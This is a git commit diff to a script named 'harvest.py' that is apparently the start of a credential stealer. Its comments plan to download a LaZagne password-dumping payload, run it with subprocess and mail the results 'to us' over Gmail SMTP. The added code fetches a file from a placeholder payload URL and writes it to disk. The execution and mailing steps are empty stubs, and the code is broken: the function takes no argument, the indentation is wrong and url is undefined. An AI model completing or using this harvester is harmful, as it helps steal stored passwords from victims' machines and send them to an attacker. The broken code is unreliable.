8786fa0dc605b43c330b924cc61550ab2295cc39
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-02 03:14:36 -0400

    Basic working Principal

--- harvest.py
+++ harvest.py
@@ -4,10 +4,17 @@ import smtplib
 import requests
 
 def get_payload():
-    #download the lazange paylaod from online
+        get_request = requests.get(url)
+        print(get_request.content)
+        name = url.split("/")[-1]
+        with open(name, "wb") as payload:
+            payload.write(get_request.content)
 
 def execute_it():
     #execute the downloaded payload using subprocess module
 
 def mail_it():
     #mail the report to us using google smtp server
+
+
+get_payload([payload_URL])
